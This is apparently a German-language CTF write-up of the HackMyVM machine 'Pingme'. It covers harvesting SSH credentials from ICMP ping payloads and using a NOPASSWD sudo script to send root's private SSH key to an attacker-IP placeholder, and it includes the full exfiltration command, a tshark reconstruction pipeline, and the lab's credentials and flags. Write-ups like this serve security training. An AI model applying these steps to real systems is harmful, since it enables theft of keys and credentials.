# Pingme - HackMyVM (Medium)

![Pingme.png](Pingme.png)

## Übersicht

*   **VM:** Pingme
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Pingme)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 5. März 2022
*   **Original-Writeup:** https://alientec1908.github.io/Pingme_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Pingme" zu erlangen. Der initiale Zugriff erfolgte durch einen unkonventionellen Informationsleak: Eine Webseite auf Port 80 löste beim Aufruf `ping`-Befehle an die IP des Besuchers aus. Durch Analyse des ICMP-Traffics mit `tcpdump` und `tshark` konnten SSH-Zugangsdaten (`pinger:P!ngM3`) extrahiert werden. Nach dem SSH-Login als `pinger` wurde eine unsichere `sudo`-Regel entdeckt, die es erlaubte, ein benutzerdefiniertes Skript (`/usr/local/sbin/sendfilebyping`) als Root ohne Passwort auszuführen. Dieses Skript sendete den Inhalt einer beliebigen Datei Zeichen für Zeichen über ICMP-Pakete an eine angegebene IP-Adresse. Dies wurde genutzt, um den privaten SSH-Schlüssel des Root-Benutzers (`/root/.ssh/id_rsa`) zu exfiltrieren, was schließlich den Root-Login ermöglichte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `curl`
*   `tcpdump`
*   `tshark`
*   `awk`
*   `cut`
*   `tr`
*   `sed`
*   `ssh`
*   `sudo`
*   Standard Linux-Befehle (`vi`, `chmod`, `ls`, `cat`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Pingme" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Initial Access (SSH als `pinger` via ICMP Data Exfiltration):**
    *   IP-Adresse des Ziels (192.168.2.124) mit `arp-scan` identifiziert. (Hinweis: Der Bericht erwähnt Port 80 als offen, obwohl der Nmap-Scan diesen nicht explizit als offen zeigte, aber der `curl`-Befehl darauf funktionierte).
    *   Ein `curl`-Aufruf auf `http://192.168.2.124` zeigte, dass die Webseite einen `ping`-Befehl an die IP des Angreifers auslöst und "transmitting ICMP packets" erwähnt.
    *   Mittels `tcpdump -i eth0 src 192.168.2.124 -w user.cap` wurde der ICMP-Traffic vom Ziel zum Angreifer aufgezeichnet.
    *   `tshark -r user.cap -V | grep ^0020 | awk '{print $18}'` (oder eine ähnliche Kette) wurde verwendet, um Daten aus dem Payload der ICMP-Pakete zu extrahieren.
    *   Aus den extrahierten Daten wurden die SSH-Credentials `pinger`:`P!ngM3` rekonstruiert.
    *   Erfolgreicher SSH-Login als `pinger` mit den gefundenen Credentials.

2.  **Privilege Escalation (von `pinger` zu `root` via `sudo` & ICMP Exfiltration):**
    *   `sudo -l` als `pinger` zeigte, dass der Befehl `/usr/local/sbin/sendfilebyping` als `root` ohne Passwort ausgeführt werden durfte: `(root) NOPASSWD: /usr/local/sbin/sendfilebyping`.
    *   Das Skript `sendfilebyping` nahm eine Ziel-IP und einen Dateipfad als Argumente entgegen und sendete den Inhalt der Datei Zeichen für Zeichen über ICMP-Pakete.
    *   Auf dem Angreifer-System wurde `tcpdump -i eth0 icmp and src 192.168.2.124 -w key.cap` gestartet, um die eingehenden ICMP-Pakete zu erfassen.
    *   Auf dem Zielsystem wurde als `pinger` der Befehl `sudo /usr/local/sbin/sendfilebyping ANGRIFFS_IP /root/.ssh/id_rsa` ausgeführt.
    *   Die aufgezeichnete `key.cap`-Datei wurde auf dem Angreifer-System mit `tshark -r key.cap -V | grep 0020 | awk '{print $18}' | cut -c 1 | tr -d '\n' | tr '.' '\n' | sed -r 's/(.*SH|P.*TE|KEY)/& /g' > id_root_rsa` verarbeitet, um den privaten SSH-Schlüssel des Root-Benutzers zu rekonstruieren.
    *   Der rekonstruierte private Schlüssel wurde in einer Datei gespeichert (z.B. `id_root`), die Berechtigungen gesetzt (`chmod 600 id_root`).
    *   Erfolgreicher SSH-Login als `root` mit dem extrahierten privaten Schlüssel (`ssh root@192.168.2.124 -i id_root`).
    *   Die User-Flag (`HMV{ICMPisSafe}`) wurde in `/home/pinger/user.txt` gefunden.
    *   Die Root-Flag (`HMV{ICMPcanBeAbused}`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Information Disclosure / Data Exfiltration via ICMP:** Die Webanwendung löste ICMP-Pings aus, die SSH-Credentials im Payload enthielten. Ein `sudo`-privilegiertes Skript ermöglichte das Auslesen beliebiger Dateien und deren Exfiltration über ICMP.
*   **Unsichere `sudo`-Regel:** Ein Benutzer durfte ein benutzerdefiniertes Skript als Root ausführen, das zum Auslesen sensibler Dateien missbraucht werden konnte.
*   **Schwache Passwörter:** Das Passwort `P!ngM3` für `pinger` war durch die ICMP-Exfiltration auffindbar.

## Flags

*   **User Flag (`/home/pinger/user.txt`):** `HMV{ICMPisSafe}`
*   **Root Flag (`/root/root.txt`):** `HMV{ICMPcanBeAbused}`

## Tags

`HackMyVM`, `Pingme`, `Medium`, `ICMP Data Exfiltration`, `Information Leak`, `sudo Exploit`, `SSH`, `Linux`, `Privilege Escalation`
